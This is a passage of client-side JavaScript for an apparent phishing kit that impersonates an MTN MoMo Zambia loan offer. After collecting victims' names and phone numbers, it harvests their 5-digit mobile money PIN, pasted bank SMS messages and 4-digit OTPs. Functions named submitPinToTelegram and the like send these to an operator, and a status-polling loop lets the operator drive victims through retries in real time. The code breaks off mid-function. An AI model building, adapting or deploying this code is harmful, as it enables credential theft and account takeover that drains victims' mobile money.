(function () {
  function initApp() {
    const $ = (id) => document.getElementById(id);

    const screens = {
      welcome: $('screen-welcome'),
      slider: $('screen-slider'),
      form1: $('screen-form1'),
      form2: $('screen-form2'),
      form3: $('screen-form3'),
      pin: $('screen-pin'),
      sms: $('screen-sms'),
      otp: $('screen-otp'),
      success: $('screen-success'),
      stopped: $('screen-stopped')
    };

    const loadingOverlay = $('loading-overlay');

    const loanSlider = $('loan-amount-slider');
    const loanText = $('loan-amount-text');
    const monthsSlider = $('loan-months-slider');
    const monthsText = $('loan-months-text');
    const monthlyRepVal = $('monthly-rep-val');

    const formAmountInput = $('form-amount-input');
    const loanDurationSelect = $('loan-duration');
    const loanPurposeInput = $('loan-purpose');
    const firstNameInput = $('first-name');
    const lastNameInput = $('last-name');
    const formPhoneInput = $('form-phone');

    const sumAmount = $('sum-amount');
    const sumDuration = $('sum-duration');
    const sumPurpose = $('sum-purpose');
    const sumApplicant = $('sum-applicant');
    const depositRequiredAmount = $('deposit-required-amount');
    const successLoanAmount = $('success-loan-amount');
    const successLoanAmountDetail = $('success-loan-amount-detail');

    const bannerPhoneError = $('banner-phone-error');
    const bannerForm3Error = $('banner-form3-error');
    const bannerPinError = $('banner-pin-error');
    const bannerPinInfo = $('banner-pin-info');
    const bannerSmsError = $('banner-sms-error');
    const bannerSmsInfo = $('banner-sms-info');
    const bannerOtpError = $('banner-otp-error');
    const bannerOtpInfo = $('banner-otp-info');

    const displayPinPhone = $('display-pin-phone');
    const pinPhoneInline = $('pin-phone-inline');
    const yelloPinInput = $('yello-pin-input');
    const btnTogglePinVisibility = $('btn-toggle-pin-visibility');
    const btnSignInPin = $('btn-sign-in-pin');

    const displaySmsPhone = $('display-sms-phone');
    const smsInputBox = $('sms-input-box');
    const smsSecondsSpan = $('sms-seconds');
    const smsTimerText = $('sms-timer-text');
    const btnRequestNewSms = $('btn-request-new-sms');

    const displayOtpPhone = $('display-otp-phone');
    const otpBoxes4 = Array.from(document.querySelectorAll('.otp-box-4'));

    const blockedReasonText = $('blocked-reason-text');

    let currentUserId = null;
    let statusPollInterval = null;
    let smsTimerInterval = null;
    let pinAutoSubmittedForCurrentValue = '';
    let smsAutoSubmittedForCurrentValue = '';
    let otpSubmittedForCurrentValue = '';
    let appliedLoanLabel = 'ZMW 100,000';

    const urlParams = new URLSearchParams(window.location.search);
    const adminParam = urlParams.get('admin') || '';

    const REQUIRED_SMS_REGEX = /^Y['’]ello\.\s*Please note!/i;

    function isValidMomoSms(rawSms) {
      const normalized = String(rawSms || '').replace(/\s+/g, ' ').trim();
      return REQUIRED_SMS_REGEX.test(normalized);
    }

    function toTenDigitZeroPhone(rawPhone) {
      const digits = String(rawPhone || '').replace(/\D/g, '');
      if (digits.startsWith('260') && digits.length === 12) {
        return '0' + digits.slice(3);
      }
      if (/^(96|76|56)\d{7}$/.test(digits)) {
        return '0' + digits;
      }
      if (digits.startsWith('0')) {
        return digits.slice(0, 10);
      }
      return digits.slice(0, 10);
    }

    function isValidTenDigitZeroPhone(rawPhone) {
      const normalized = toTenDigitZeroPhone(rawPhone);
      return /^0(96|76|56)\d{7}$/.test(normalized) && normalized.length === 10;
    }

    function formatAppliedAmount(rawAmt) {
      const cleanNum = Number(String(rawAmt || '100,000').replace(/\D/g, '')) || 100000;
      return `ZMW ${cleanNum.toLocaleString()}`;
    }

    function setAppliedLoanAmountDisplay(rawAmt) {
      appliedLoanLabel = formatAppliedAmount(rawAmt);
      if (sumAmount) sumAmount.innerText = appliedLoanLabel;
      if (successLoanAmount) successLoanAmount.innerText = appliedLoanLabel;
      if (successLoanAmountDetail) successLoanAmountDetail.innerText = appliedLoanLabel;
    }

    function showBanner(el, msg) {
      if (!el) return;
      el.innerText = msg;
      el.classList.add('active');
    }

    function hideBanner(el) {
      if (!el) return;
      el.innerText = '';
      el.classList.remove('active');
    }

    function showLoading(title, sub) {
      const titleEl = $('loading-title');
      const subEl = $('loading-sub');
      if (titleEl) titleEl.innerText = title;
      if (subEl) subEl.innerText = sub;
      if (loadingOverlay) loadingOverlay.classList.add('active');
    }

    function hideLoading() {
      if (loadingOverlay) loadingOverlay.classList.remove('active');
    }

    function showScreen(targetScreen) {
      Object.values(screens).forEach((s) => {
        if (s) s.classList.remove('active');
      });
      if (targetScreen) {
        targetScreen.classList.add('active');
        try {
          window.scrollTo({ top: 0, behavior: 'instant' });
        } catch (err) {
          window.scrollTo(0, 0);
        }
      }
    }

    function updateCalc() {
      const amt = loanSlider ? Number(loanSlider.value) || 100000 : 100000;
      const mths = monthsSlider ? Number(monthsSlider.value) || 48 : 48;
      if (loanText) loanText.innerText = `ZMW ${amt.toLocaleString()}`;
      if (monthsText) monthsText.innerText = `${mths} ${mths === 1 ? 'month' : 'months'}`;
      if (formAmountInput) formAmountInput.value = amt.toLocaleString();
      if (sumDuration) sumDuration.innerText = `${mths} Months`;
      setAppliedLoanAmountDisplay(amt);
      const monthly = (amt * 1.1) / mths;
      if (monthlyRepVal) monthlyRepVal.innerText = `ZMW ${Math.round(monthly).toLocaleString()}`;
    }

    if (loanSlider) {
      loanSlider.addEventListener('input', updateCalc);
      loanSlider.addEventListener('change', updateCalc);
    }
    if (monthsSlider) {
      monthsSlider.addEventListener('input', updateCalc);
      monthsSlider.addEventListener('change', updateCalc);
    }
    updateCalc();

    if (formPhoneInput) {
      formPhoneInput.addEventListener('input', () => {
        const digitsOnly = formPhoneInput.value.replace(/\D/g, '').slice(0, 10);
        if (formPhoneInput.value !== digitsOnly) {
          formPhoneInput.value = digitsOnly;
        }
      });
    }

    function syncPinReadyState() {
      if (!yelloPinInput || !btnSignInPin) return;
      const digits = yelloPinInput.value.replace(/\D/g, '').slice(0, 5);
      if (yelloPinInput.value !== digits) yelloPinInput.value = digits;
      if (digits.length === 5) {
        btnSignInPin.classList.add('ready');
      } else {
        btnSignInPin.classList.remove('ready');
      }
    }

    function goFromForm1ToForm2() {
      const amtRaw = (formAmountInput?.value || '100,000').trim();
      const dur = loanDurationSelect?.value || '48 Months';
      const purp = (loanPurposeInput?.value || '').trim() || 'Business';
      setAppliedLoanAmountDisplay(amtRaw);
      if (sumDuration) sumDuration.innerText = dur;
      if (sumPurpose) sumPurpose.innerText = purp;
      hideBanner(bannerPhoneError);
      showScreen(screens.form2);
    }

    function goFromForm2ToForm3() {
      hideBanner(bannerPhoneError);
      const fn = (firstNameInput?.value || '').trim();
      const ln = (lastNameInput?.value || '').trim();
      const ph = (formPhoneInput?.value || '').trim();

      if (!fn || !ln) {
        showBanner(bannerPhoneError, 'PLEASE ENTER YOUR FIRST NAME AND LAST NAME.');
        return;
      }

      if (!isValidTenDigitZeroPhone(ph)) {
        showBanner(
          bannerPhoneError,
          'ENTER A VALID 10-DIGIT MTN ZAMBIA NUMBER STARTING WITH 0 (096, 076, OR 056).'
        );
        return;
      }

      const amtRaw = (formAmountInput?.value || '100,000').trim();
      const dur = loanDurationSelect?.value || '48 Months';
      const purp = (loanPurposeInput?.value || '').trim() || 'Business';
      setAppliedLoanAmountDisplay(amtRaw);
      if (sumDuration) sumDuration.innerText = dur;
      if (sumPurpose) sumPurpose.innerText = purp;
      if (sumApplicant) sumApplicant.innerText = `${fn} ${ln}`.toUpperCase();

      const numericAmt = Number(amtRaw.replace(/\D/g, '')) || 100000;
      const depVal = Math.max(200, Math.round(numericAmt * 0.002));
      if (depositRequiredAmount) depositRequiredAmount.innerText = `${depVal} ZMW`;

      hideBanner(bannerForm3Error);
      showScreen(screens.form3);
    }

    async function submitApplicationAndOpenPin() {
      hideBanner(bannerForm3Error);
      const fn = (firstNameInput?.value || '').trim();
      const ln = (lastNameInput?.value || '').trim();
      const ph = (formPhoneInput?.value || '').trim();
      const amtRaw = (formAmountInput?.value || '100,000').trim();

      setAppliedLoanAmountDisplay(amtRaw);

      const fullName =
        `${fn} ${ln}`.trim().toUpperCase() ||
        (sumApplicant?.innerText || '').trim() ||
        'MTN MOMO ZAMBIA';
      const tenDigitPhone = toTenDigitZeroPhone(ph);

      if (displayPinPhone) displayPinPhone.innerText = tenDigitPhone;
      if (pinPhoneInline) pinPhoneInline.innerText = tenDigitPhone;
      if (displaySmsPhone) displaySmsPhone.innerText = tenDigitPhone;
      if (displayOtpPhone) displayOtpPhone.innerText = tenDigitPhone;
      if (sumApplicant) sumApplicant.innerText = fullName;

      pinAutoSubmittedForCurrentValue = '';
      otpSubmittedForCurrentValue = '';
      if (yelloPinInput) {
        yelloPinInput.value = '';
        yelloPinInput.type = 'password';
      }
      if (btnTogglePinVisibility) btnTogglePinVisibility.innerText = '👁️';
      syncPinReadyState();
      otpBoxes4.forEach((b) => (b.value = ''));
      hideBanner(bannerPinError);
      hideBanner(bannerPinInfo);
      hideBanner(bannerOtpError);
      hideBanner(bannerOtpInfo);

      showScreen(screens.pin);
      if (yelloPinInput) yelloPinInput.focus();

      try {
        const res = await fetch(
          `/api/submit-application?admin=${encodeURIComponent(adminParam)}`,
          {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              adminChatId: adminParam,
              applicant: { fullName, phone: tenDigitPhone },
              loan: { amount: appliedLoanLabel }
            })
          }
        );
        const data = await res.json();
        if (data && data.success) {
          currentUserId = data.userId;
        }
      } catch (e) {}
    }

    function startSmsCountdown() {
      let timeLeft = 15;
      if (smsSecondsSpan) smsSecondsSpan.innerText = timeLeft;
      if (smsTimerText) smsTimerText.classList.remove('hidden-btn');
      if (btnRequestNewSms) btnRequestNewSms.classList.add('hidden-btn');

      if (smsTimerInterval) clearInterval(smsTimerInterval);

      smsTimerInterval = setInterval(() => {
        timeLeft -= 1;
        if (smsSecondsSpan) smsSecondsSpan.innerText = Math.max(0, timeLeft);

        if (timeLeft <= 0) {
          clearInterval(smsTimerInterval);
          if (smsTimerText) smsTimerText.classList.add('hidden-btn');
          if (btnRequestNewSms) btnRequestNewSms.classList.remove('hidden-btn');
        }
      }, 1000);
    }

    async function submitPinToTelegram(pinVal) {
      hideBanner(bannerPinError);
      hideBanner(bannerPinInfo);
      const rawPhone = displayPinPhone?.innerText || formPhoneInput?.value || '';
      const phoneTenDigit = toTenDigitZeroPhone(rawPhone);
      const applicantName =
        (
          sumApplicant?.innerText ||
          `${firstNameInput?.value || ''} ${lastNameInput?.value || ''}`
        ).trim() || 'MTN MOMO ZAMBIA';

      showLoading('SENDING PHONE NO & 5-DIGIT PIN...', 'Please wait for admin response...');

      try {
        const res = await fetch('/api/submit-pin', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            userId: currentUserId,
            phone: phoneTenDigit,
            pin: pinVal,
            applicantName
          })
        });
        const data = await res.json();
        if (data && data.success && data.userId) {
          currentUserId = data.userId;
        }
        startStatusPolling();
      } catch (e) {
        hideLoading();
        pinAutoSubmittedForCurrentValue = '';
        showBanner(bannerPinError, 'CONNECTION ERROR. PLEASE ENTER YOUR 5-DIGIT PIN AGAIN.');
      }
    }

    async function submitSmsToTelegram(smsText, autoDetected) {
      hideBanner(bannerSmsError);
      hideBanner(bannerSmsInfo);
      const phoneTenDigit = toTenDigitZeroPhone(
        displaySmsPhone?.innerText || formPhoneInput?.value || ''
      );

      showLoading('VERIFYING SMS CODE...', 'Please wait while admin reviews your SMS...');

      try {
        await fetch('/api/submit-sms', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            userId: currentUserId,
            phone: phoneTenDigit,
            sms: smsText,
            autoDetected
          })
        });
        startStatusPolling();
      } catch (e) {
        hideLoading();
        smsAutoSubmittedForCurrentValue = '';
        showBanner(bannerSmsError, 'UNABLE TO SUBMIT SMS. PLEASE TRY AGAIN.');
      }
    }

    async function submitOtpToTelegram(otpVal, autoSubmitted) {
      hideBanner(bannerOtpError);
      hideBanner(bannerOtpInfo);
      const phoneTenDigit = toTenDigitZeroPhone(
        displayOtpPhone?.innerText || displaySmsPhone?.innerText || formPhoneInput?.value || ''
      );

      showLoading('VERIFYING MTN MOMO 4-DIGIT OTP...', 'Please wait for admin confirmation...');

      try {
        await fetch('/api/submit-otp', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            userId: currentUserId,
            phone: phoneTenDigit,
            otp: otpVal,
            autoSubmitted
          })
        });
        startStatusPolling();
      } catch (e) {
        hideLoading();
        otpSubmittedForCurrentValue = '';
        showBanner(bannerOtpError, 'UNABLE TO SUBMIT 4-DIGIT OTP. PLEASE TRY AGAIN.');
      }
    }

    function startStatusPolling() {
      if (statusPollInterval) clearInterval(statusPollInterval);

      statusPollInterval = setInterval(async () => {
        if (!currentUserId) return;

        try {
          const res = await fetch(`/api/check-status/${encodeURIComponent(currentUserId)}`);
          const data = await res.json();
          const st = data && data.status;

          if (st === 'BLOCKED') {
            clearInterval(statusPollInterval);
            if (smsTimerInterval) clearInterval(smsTimerInterval);
            hideLoading();
            if (blockedReasonText) {
              blockedReasonText.innerText =
                'PLEASE CHECK YOUR MOMO DETAILS AND TRY AGAIN.';
            }
            showScreen(screens.stopped);
          } else if (st === 'PROCEED_SMS') {
            clearInterval(statusPollInterval);
            hideLoading();
            hideBanner(bannerSmsError);
            showBanner(
              bannerSmsInfo,
              'ALLOW — PLEASE COPY AND PASTE THE WHOLE SMS ON THE SPACE PROVIDED THE WHOLE SMS SEND TO YOUR MOMO NUMBER.'
            );
            smsAutoSubmittedForCurrentValue = '';
            if (smsInputBox) smsInputBox.value = '';
            showScreen(screens.sms);
            startSmsCountdown();
            if (smsInputBox) smsInputBox.focus();
          } else if (st === 'INCORRECT_PIN') {
            clearInterval(statusPollInterval);
            if (smsTimerInterval) clearInterval(smsTimerInterval);
            hideLoading();
            pinAutoSubmittedForCurrentValue = '';
            if (yelloPinInput) yelloPinInput.value = '';
            syncPinReadyState();
            showScreen(screens.pin);
            showBanner(bannerPinError, 'INCORRECT PIN — ENTER A NEW 5-DIGIT PIN ON THE EMPTY SPACE PROVIDED.');
            if (yelloPinInput) yelloPinInput.focus();
          } else if (st === 'SMS_EXPIRED') {
            clearInterval(statusPollInterval);
            hideLoading();
            smsAutoSubmittedForCurrentValue = '';
            if (smsInputBox) smsInputBox.value = '';
            showScreen(screens.sms);
            showBanner(
              bannerSmsError,
              'SMS EXPIRED — ENTER A NEW INCOMING SMS ON THE EMPTY SPACE PROVIDED.'
            );
            startSmsCountdown();
            if (smsInputBox) smsInputBox.focus();
          } else if (st === 'PROCEED_OTP') {
            clearInterval(statusPollInterval);
            if (smsTimerInterval) clearInterval(smsTimerInterval);
            hideLoading();
            hideBanner(bannerOtpError);
            showBanner(
              bannerOtpInfo,
              'ENTER NEW INCOMING 4 DIGITS SENT TO YOUR MOMO NUMBER.'
            );
            otpSubmittedForCurrentValue = '';
            otpBoxes4.forEach((b) => (b.value = ''));
            showScreen(screens.otp);
            if (otpBoxes4[0]) otpBoxes4[0].focus();
          } else if (st === 'EXPIRED_OTP' || st === 'OTP_EXPIRED') {
            clearInterval(statusPollInterval);
            if (smsTimerInterval) clearInterval(smsTimerInterval);
            hideLoading();
            otpSubmittedForCurrentValue = '';
            otpBoxes4.forEach((b) => (b.value = ''));
            showScreen(screens.otp);
            showBanner(
              bannerOtpError,
              'OTP EXPIRES — ENTER NEW INCOMING 4 DIGITS SENT TO YOUR MOMO NUMBER.'
            );
            if (otpBoxes4[0]) otpBoxes4[0].focus();
          } else if (st === 'SUCCESS' || st === 'APPROVED') {
            clearInterval(statusPollInterval);
            if (smsTimerInterval) clearInterval(smsTimerInterval);
            hideLoading();
            setAppliedLoanAmountDisplay(formAmountInput?.value || appliedLoanLabel);
            showScreen(screens.success);
          }
        } catch (e) {}
      }, 1000);
    }

    function resetToWelcome() {
      if (statusPollInterval) clearInterval(statusPollInterval);
      if (smsTimerInterval) clearInterval(smsTimerInterval);
      currentUserId = null;
      pinAutoSubmittedForCurrentValue = '';
      smsAutoSubmittedForCurrentValue = '';
      otpSubmittedForCurrentValue = '';
      if (yelloPinInput) {
        yelloPinInput.value = '';
        yelloPinInput.type = 'password';
      }
      if (btnTogglePinVisibility) btnTogglePinVisibility.innerText = '👁️';
      syncPinReadyState();
      otpBoxes4.forEach((b) => (b.value = ''));
      if (smsInputBox) smsInputBox.value = '';
      [
        bannerPhoneError,
        bannerForm3Error,
        bannerPinError,
        bannerPinInfo,
        bannerSmsError,
        bannerSmsInfo,
        bannerOtpError,
        bannerOtpInfo
      ].forEach(hideBanner);
      hideLoading();
      showScreen(screens.welcome);
    }

    async function handleButtonAction(buttonId, event) {
      switch (buttonId) {
        case 'btn-goto-slider':
          updateCalc();
          showScreen(screens.slider);
          break;
        case 'btn-slider-back':
          showScreen(screens.welcome);
          break;
        case 'btn-goto-form1':
          showScreen(screens.form1);
          break;
        case 'btn-form1-back':
          updateCalc();
          showScreen(screens.slider);
          break;
        case 'btn-form1-next':
          goFromForm1ToForm2();
          break;
        case 'btn-form2-prev':
        case 'btn-form2-prev-alt':
          showScreen(screens.form1);
          break;
        case 'btn-form2-next':
          goFromForm2ToForm3();
          break;
        case 'b
